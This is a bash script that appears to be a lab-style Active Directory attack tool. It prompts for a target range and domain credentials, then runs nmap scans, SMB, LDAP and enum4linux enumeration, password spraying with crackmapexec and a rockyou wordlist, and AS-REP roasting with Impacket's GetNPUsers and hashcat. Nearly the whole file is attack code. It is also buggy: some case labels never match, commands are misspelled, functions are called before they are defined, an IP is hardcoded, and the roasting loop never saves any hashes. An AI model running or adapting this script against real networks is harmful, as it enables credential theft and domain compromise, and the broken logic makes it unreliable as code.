#!/bin/bash

prompt() {
    local prompt_text=$1
    local default_value=$2
    local input

    read -p "$prompt_text" input
    if [ -z "$input" ]; then
        input=$default_value
    fi
    echo $input
}


select_scanning_mode() {
    local mode
    PS3="Select scanning mode (1. Basic, 2. Intermediate, 3. Advanced): "
    options=("Basic" "Intermediate" "Advanced")
    select opt in "${options[@]}"; do
        case $REPLY in
            1|2|3) mode=$opt; break;;
            *) echo "Invalid option $REPLY";;
        esac
    done
    echo $mode
}


target=$(prompt "Enter the target network range for scanning: ")


read -p "Enter the Domain name: " domain_name
read -p "Enter the AD username: " ad_username
read -s -p "Enter the AD password: " ad_password

echo


password_list=$(prompt "Enter the path to the password list (default: /usr/share/wordlists/rockyou.txt): " "/usr/share/wordlists/rockyou.txt")
read -p "Please enter username list:" username_list


echo "Select the desired operation level for each mode:"
select_level() {
    local mode=$1
    local level
    PS3="Choose the operation level for $mode (1. Basic, 2. Intermediate, 3. Advanced, 4. None): "
    options=("Basic" "Intermediate" "Advanced" "None")
    select opt in "${options[@]}"; do
        case $REPLY in
            1|2|3|4) level=$opt; break;;
            *) echo "Invalid option $REPLY";;
        esac
    done
    echo $level
}

scanning_level=$(select_level "Scanning")
enumeration_level=$(select_level "Enumeration")
exploitation_level=$(select_level "Exploitation")


case $scanning_level in
    "Basic")
        nmap_options="nmap $target -Pn"
       echo "Running Nmap scan to assume all hosts and services are online option on: $target"
       nmap $target -Pn
        ;;
    "Intermediate")
        nmap_options="nmap $target -p-"
       echo "Running Nmap to scan all 65535 ports on: $target"
        nmap $target -p- -Pn
        ;;
    "Advanced")
        nmap_options="nmap $target -sS -sU"
        echo "UDP scanning for a thorough analysis: $target"
        sudo nmap $target -Pn -sS -sU
        ;;
    *)
        nmap_options=""
        ;;
esac

case $enumeration_level in
    "[+] Basic")
        nmap_options="nmap $target -Pn"
       echo "Running Nmap scan to assume all hosts and services are online option on: $target"
nmap 192.168.246.131 -Pn -sV 

echo "Identifying the IP address of the Domain Controller..."
domain_controller_ip=$(nslookup -type=SRV _ldap._tcp.dc._msdcs.$(hostname -d) | grep 'Address:' | tail -n 1 | awk '{print $2}')
echo "Domain Controller IP: $domain_controller_ip"

echo "Identifying the IP address of the DHCP server..."
dhcp_server_ip=$(grep -i dhcp-server-identifier /var/lib/dhcp/dhclient.leases | tail -1 | awk '{print $3}' | tr -d ';')
echo "DHCP Server IP: $dhcp_server_ip"

        ;;
    "[+] Intermediate")
       
enumerate_services() {
    local target="$1"

    echo "Enumerating IPs for key services..."
    nnmap -p 21,22,445,5985,636,3389 --open -Pn $target 
}


enumerate_shared_folders() {
    local target="$1"

    echo "Enumerating shared folders..."
    echo -e "username\nPassw0rd!\nls" | smbclient -L //$target  
}


run_nse_scripts() {
    local target="$1"

    echo "Running NSE scripts for domain network enumeration..."
    
    
    nmap --script smb-enum-shares.nse --script-args=smbuser=$ad_username,smbpass=$ad_password -p 445 192.168.246.131 -Pn
    nmap --script ldap-search.nse -p 389 $target -oN l 
    nmap --script smb-os-discovery.nse -p 445 $target -oN 
}


enumerate_services "$target"
enumerate_shared_folders "$target"
run_nse_scripts "$target"
run_enum4linux "$target"

     ;;
    "Advanced")
        nmap_options="nmap $target -p-"
    echo "Running enum4linux for detailed enumeration..."
    enum4linux -a -u "$ad_username" -p "$ad_password" "$target" > enum4linux_results.txt 2>/dev/null

    echo "[+]Extracting all users..."
    cat enum4linux_results.txt | grep user: >> users.txt

    echo "[+][+]Extracting all groups..."
    cat enum4linux_results.txt | grep group: >> group.txt

    echo "[+][+][+]Extracting all shares..."
    cat enum4linux_results.txt | grep Disk >> shared.txt

    echo "[+][+][+][+]Displaying password policy..."
    cat enum4linux_results.txt | grep Password | head -13 >> password_policy.txt

    echo "[+][+][+][+][+]Finding disabled accounts..."
    cat enum4linux_results.txt | grep -E "514|546"  >> disabled_accounts.txt

    echo "[+][+][+][+][+][+]Finding never-expired accounts..."
    cat enum4linux_results.txt | grep account
    
    echo "[+][+][+][+][+][+][+]Displaying accounts that are members of the Domain Admins group..."
    cat enum4linux_results.txt | grep "Domain Admins" >> domain_admins.txt
    
 echo "[+] Results saved in a txt files."
 
run_enum4linux() {
    local target="$1"
    local username="$2"
    local password="$3"

    echo "Running enum4linux for detailed enumeration..."
    enum4linux -a -u "$ad_username" -p "$ad_password" "$target" > enum4linux_results.txt 2>/dev/null
}

extract_info() {
     local output_file="enum4linux_results.txt"

    echo "Extracting all users..."
    cat enum4linux_results.txt | grep user: >> users.txt

    echo "Extracting all groups..."
    cat enum4linux_results.txt | grep group: >> group.txt

    echo "Extracting all shares..."
    cat enum4linux_results.txt | grep Disk >> shared.txt

    echo "Displaying password policy..."
    cat enum4linux_results.txt | grep Password | head -13 >> password_policy.txt

    echo "Finding disabled accounts..."
    cat enum4linux_results.txt | grep -E "514|546"  >> disabled_accounts.txt

    echo "Finding never-expired accounts..."
    cat enum4linux_results.txt | grep account

    echo "Displaying accounts that are members of the Domain Admins group..."
    cat enum4linux_results.txt | grep "Domain Admins" >> domain_admins.txt
}
esac


case $exploitation_level in
    "Basic")
        nmap_options="nmap --script=vuln"
       echo "Running the NSE vulnerability scanning script on: $target"
       nmap --script=vuln 192.168.246.131 -Pn

        ;;
    "Intermediate")
       
       echo "[+] Starting password spraying to identify weak credentials on: $target"
        crackmapexec smb target_ip_range -u $username_list -p $password_list

        ;;
    "Advanced")
     
ASREP_HASHES_FILE="asrep_hashes.txt"
IMPACKET_PATH="/home/kali/Desktop/impacket/examples"
LOG_FILE="extract_and_crack_kerberos.log"
TEMP_FILE="temp_asrep_hashes.txt"

echo "[*] If you would like to use the advanced option please provide Username and Password list first [*]"

sleep 2

if [[ ! -f "$username_list" ]]; then
    echo "Error: $username_list not found!" | tee -a $LOG_FILE
    exit 1
fi

if [[ ! -f "$password_list" ]]; then
    echo "Error: $password_list not found!" | tee -a $LOG_FILE
    exit 1
fi


> $LOG_FILE
> $ASREP_HASHES_FILE


echo "Extracting Kerberos tickets..." | tee -a $LOG_FILE

while IFS= read -r user; do
    echo "Processing user: $user" | tee -a $LOG_FILE
    python $IMPACKET_PATH/GetNPUsers.py $domain_name/$user -dc-ip $target -no-pass > $TEMP_FILE 2>> $LOG_FILE
    
    if grep -q "KDC_ERR_C_PRINCIPAL_UNKNOWN" $LOG_FILE; then
        echo "User $user not found in Kerberos database" | tee -a $LOG_FILE
   
      
    fi
    
    > $TEMP_FILE
done < "$username_list"

if [[ ! -s $ASREP_HASHES_FILE ]]; then
    echo "[+] No valid Kerberos tickets extracted. ***Exiting***" | tee -a $LOG_FILE
    exit 1
fi

echo "Kerberos tickets extracted and saved to $ASREP_HASHES_FILE" | tee -a $LOG_FILE


echo "Cracking the Kerberos tickets..." | tee -a $LOG_FILE
hashcat -m 18200 $ASREP_HASHES_FILE $password_list 2>> $LOG_FILE

if [[ $? -ne 0 ]]; then
    echo "Error: Failed to crack Kerberos tickets! Check $LOG_FILE for details." | tee -a $LOG_FILE
    exit 1
fi

echo "Kerberos tickets cracked. Check hashcat output for results." | tee -a $LOG_FILE


echo "Cracked passwords:" | tee -a $LOG_FILE

echo "Done." | tee -a $LOG_FILE



        ;;
    *)
        nmap_options=""
        ;;
esac
